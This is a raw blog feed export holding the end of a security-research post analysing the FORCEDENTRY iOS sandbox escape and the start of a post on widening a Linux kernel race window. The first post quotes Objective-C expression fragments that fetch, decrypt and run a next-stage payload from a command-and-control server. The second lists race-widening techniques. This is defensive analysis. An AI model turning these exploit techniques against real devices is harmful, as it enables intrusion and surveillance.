class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The innermost reference to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;here grabs the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSURLComponents&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and builds the full url from the query string parameters set last earlier. That url is passed to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;[NSData dataWithContentsOfURL:]&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;to fetch a data blob from a remote server.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;That data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is stored in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;sharedAnonymizedStrings&lt;/span&gt;&lt;span&gt;&amp;nbsp;dictionary under the key &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.rmw3ubtmn06v\"&gt;&lt;span class=\"YDzVciBUld-c10 YDzVciBUld-c3\"&gt;Expression 5&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ [[NSThread mainThread] threadDictionary]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; addEntriesFromDictionary:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;1&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;This copies all the keys and values from the &amp;quot;next-stage&amp;quot; plist into the main thread&amp;#39;s theadDictionary.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"YDzVciBUld-c8\" id=\"h.qzgbnlme8c4b\"&gt;&lt;span class=\"YDzVciBUld-c10 YDzVciBUld-c3\"&gt;Expression 6&lt;/span&gt;&lt;/h3&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[ [NSExpression expressionWithFormat:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [[[CaliCalendarAnonymizer sharedAnonymizedStrings]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; objectForKey:@&amp;quot;1&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; objectForKey: @&amp;quot;a&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0 YDzVciBUld-c2\"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; expressionValueWithObject:nil context:nil&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Finally, this fetches the value of the &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;a&lt;/span&gt;&lt;span&gt;&amp;quot; key from the next-stage plist, parses it as an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;string and evaluates it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.5m5pj8ghutz4\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;End of the line&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;At this point we lose the ability to follow the exploit. The attackers have escaped the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox, requested a next-stage from the command and control server and executed it, all without any memory corruption or dependencies on particular versions of the operating system.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;In response to this exploit&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes\"&gt;iOS 15.1 significantly reduced the computational power available to NSExpressions&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4 YDzVciBUld-c12\"&gt;&lt;span class=\"YDzVciBUld-c3 YDzVciBUld-c13\"&gt;NSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects. Additionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1 YDzVciBUld-c12\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;In addition the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects have been hardened with the following check added around the parsing of serialized &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicates&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;if (os_variant_allows_internal_security_policies(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;com.apple.PrototypeTools&amp;quot;) {&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; [coder decodeObjectOfClass:NSPredicate forKey:@&amp;quot;condition]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Object deserialization across trust boundaries still presents an enormous attack surface however&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.fyh8k0aja0xk\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Perhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained sandbox. With just two tricks (&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers in protocols and library loading gadgets) it&amp;#39;s likely possible to attack almost every &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;initWithCoder&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;dyld_shared_cache&lt;/span&gt;&lt;span&gt;. There are presumably many other classes in addition to &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;which provide the building blocks for logic-style exploits.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;The expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was designed with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and reviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine exactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;NSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make the attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that the attack surface exposed there likely isn&amp;#39;t reviewable; it&amp;#39;s simply too large for anything beyond a basic&lt;/span&gt;&lt;span&gt;&amp;nbsp;example&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;Refactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would be a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC; it&amp;#39;s built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the exposed attack surface is just too large to audit effectively.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The advent of Memory Tagging Extensions (MTE), likely shipping in multiple consumer devices across the ARM ecosystem this year,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://www.usenix.org/system/files/login/articles/login_summer19_03_serebryany.pdf\"&gt;is a big step in the defense against memory corruption exploitation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. But attackers innovate too, and are likely already two steps ahead with a renewed focus on logic bugs. This sandbox escape exploit is likely a sign of the shift we can expect to see over the next few years if the promises of MTE can be delivered. And this exploit was far more extensible, reliable and generic than almost any memory corruption exploit could ever hope to be.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1353264177358891846"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html","@title":"FORCEDENTRY: Sandbox Escape"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s72-c/image1%286%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-2892029424446991022","published":"2022-03-24T13:51:00.005-07:00","updated":"2022-08-24T12:08:43.176-07:00","title":{"@type":"text","#text":"Racing against the clock -- hitting a tiny kernel race window"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;.lst-kix_oh8g77k3z2ge-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_94mysn7p9quk-2.start{counter-reset:lst-ctn-kix_94mysn7p9quk-2 0}.lst-kix_94mysn7p9quk-5&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-5}.lst-kix_oh8g77k3z2ge-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_94mysn7p9quk-7{list-style-type:none}ol.lst-kix_94mysn7p9quk-6{list-style-type:none}.lst-kix_oh8g77k3z2ge-7&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_94mysn7p9quk-8{list-style-type:none}.lst-kix_oh8g77k3z2ge-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_94mysn7p9quk-3{list-style-type:none}ol.lst-kix_94mysn7p9quk-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-5{list-style-type:none}ol.lst-kix_94mysn7p9quk-4{list-style-type:none}.lst-kix_oh8g77k3z2ge-5&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_94mysn7p9quk-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-0{list-style-type:none}.lst-kix_oh8g77k3z2ge-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_94mysn7p9quk-0&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-0}.lst-kix_oh8g77k3z2ge-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_oh8g77k3z2ge-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_94mysn7p9quk-5.start{counter-reset:lst-ctn-kix_94mysn7p9quk-5 0}.lst-kix_94mysn7p9quk-4&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-4}.lst-kix_oh8g77k3z2ge-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_94mysn7p9quk-8.start{counter-reset:lst-ctn-kix_94mysn7p9quk-8 0}.lst-kix_u4yb8nbjtsh3-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_u4yb8nbjtsh3-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_94mysn7p9quk-1.start{counter-reset:lst-ctn-kix_94mysn7p9quk-1 0}.lst-kix_u4yb8nbjtsh3-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_u4yb8nbjtsh3-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_94mysn7p9quk-0&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-0,decimal) \". \"}.lst-kix_u4yb8nbjtsh3-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_94mysn7p9quk-3&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-3}.lst-kix_94mysn7p9quk-6&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-6}ol.lst-kix_94mysn7p9quk-4.start{counter-reset:lst-ctn-kix_94mysn7p9quk-4 0}.lst-kix_94mysn7p9quk-2&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-2}ol.lst-kix_94mysn7p9quk-7.start{counter-reset:lst-ctn-kix_94mysn7p9quk-7 0}.lst-kix_94mysn7p9quk-6&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-6,decimal) \". \"}.lst-kix_94mysn7p9quk-8&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-8}ul.lst-kix_oh8g77k3z2ge-7{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-8{list-style-type:none}.lst-kix_94mysn7p9quk-5&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-5,lower-roman) \". \"}ul.lst-kix_oh8g77k3z2ge-3{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-4{list-style-type:none}.lst-kix_u4yb8nbjtsh3-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_oh8g77k3z2ge-5{list-style-type:none}ul.lst-kix_oh8g77k3z2ge-6{list-style-type:none}.lst-kix_94mysn7p9quk-4&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-4,lower-latin) \". \"}ul.lst-kix_oh8g77k3z2ge-0{list-style-type:none}.lst-kix_u4yb8nbjtsh3-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_u4yb8nbjtsh3-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_oh8g77k3z2ge-1{list-style-type:none}.lst-kix_94mysn7p9quk-1&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-1}ul.lst-kix_oh8g77k3z2ge-2{list-style-type:none}ol.lst-kix_94mysn7p9quk-0.start{counter-reset:lst-ctn-kix_94mysn7p9quk-0 0}.lst-kix_94mysn7p9quk-1&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-1,lower-latin) \". \"}.lst-kix_94mysn7p9quk-3&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-3,decimal) \". \"}.lst-kix_94mysn7p9quk-7&gt;li{counter-increment:lst-ctn-kix_94mysn7p9quk-7}.lst-kix_u4yb8nbjtsh3-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_94mysn7p9quk-2&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-2,lower-roman) \". \"}ul.lst-kix_u4yb8nbjtsh3-6{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-5{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-8{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-7{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-2{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-1{list-style-type:none}ol.lst-kix_94mysn7p9quk-3.start{counter-reset:lst-ctn-kix_94mysn7p9quk-3 0}ul.lst-kix_u4yb8nbjtsh3-4{list-style-type:none}ul.lst-kix_u4yb8nbjtsh3-3{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_94mysn7p9quk-6.start{counter-reset:lst-ctn-kix_94mysn7p9quk-6 0}.lst-kix_94mysn7p9quk-7&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-7,lower-latin) \". \"}.lst-kix_94mysn7p9quk-8&gt;li:before{content:\"\" counter(lst-ctn-kix_94mysn7p9quk-8,lower-roman) \". \"}ul.lst-kix_u4yb8nbjtsh3-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c15{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c8{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:\"Arial\";font-style:normal}.c5{color:#cc0000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:\"Courier New\";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:italic}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:\"Courier New\";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c10{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-style:normal}.c7{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c11{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c22{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c23{font-weight:400;font-size:16pt;font-family:\"Arial\"}.c19{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c4{font-weight:400;font-family:\"Courier New\"}.c20{padding:0;margin:0}.c12{color:inherit;text-decoration:inherit}.c17{margin-left:108pt;padding-left:0pt}.c14{margin-left:36pt;padding-left:0pt}.c21{margin-left:72pt;padding-left:0pt}.c16{font-style:italic}.c25{background-color:#f4cccc}.c6{font-weight:700}.c18{font-family:\"Courier New\"}.c9{font-size:9pt}.c24{font-size:10pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c19\"&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;TL;DR:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;How to make a tiny kernel race window really large even on kernels without &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c20 lst-kix_u4yb8nbjtsh3-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span&gt;use&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;a cache miss to widen the race window a little bit&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span class=\"c1\"&gt;make a timerfd expire in that window (which will run in an interrupt handler - in other words, in hardirq context)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c3 c14 li-bullet-0\"&gt;&lt;span class=\"c1\"&gt;make sure that the wakeup triggered by the timerfd has to churn through 50000 waitqueue items created by epoll&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;Racing one thread against a timer also avoids accumulating timing variations from two threads in each race attempt - hence the title. On the other hand, it also means you now have to deal with how hardware timers actually work, which introduces its own flavors of weird timing variations.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c15\" id=\"h.au2flcod0vb\"&gt;&lt;span class=\"c8\"&gt;Introduction&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;I recently discovered a race condition (&lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://crbug.com/project-zero/2247\"&gt;https://crbug.com/project-zero/2247&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) in the Linux kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;(While trying to explain to someone how &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca\"&gt;the fix for CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;worked - I was explaining why the Unix GC is now safe, and then got confused because I couldn&amp;#39;t actually figure out why it&amp;#39;s safe after that fix, eventually realizing that it actually isn&amp;#39;t safe.) It&amp;#39;s a fairly narrow race window, so I was wondering whether it could be hit with a small number of attempts - especially on kernels that aren&amp;#39;t built with &lt;/span&gt;&lt;span class=\"c4\"&gt;CONFIG_PREEMPT&lt;/span&gt;&lt;span&gt;, which would make it possible to preempt a thread with another thread, &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=12\"&gt;as I described at LSSEU2019&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;This is a writeup of how I managed to hit the race on a normal Linux desktop kernel, with a hit rate somewhere around 30% if the proof of concept has been tuned for the specific machine. I didn&amp;#39;t do a full exploit though, I stopped at getting evidence of use-after-free (UAF) accesses (with the help of a very large file descriptor table and &lt;/span&gt;&lt;span class=\"c11\"&gt;&lt;a class=\"c121\" href=\"https://lwn.net/Articles/819834/\"&gt;userfaultfd&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c1\"&gt;, which might not be available to normal users depending on system configuration) because 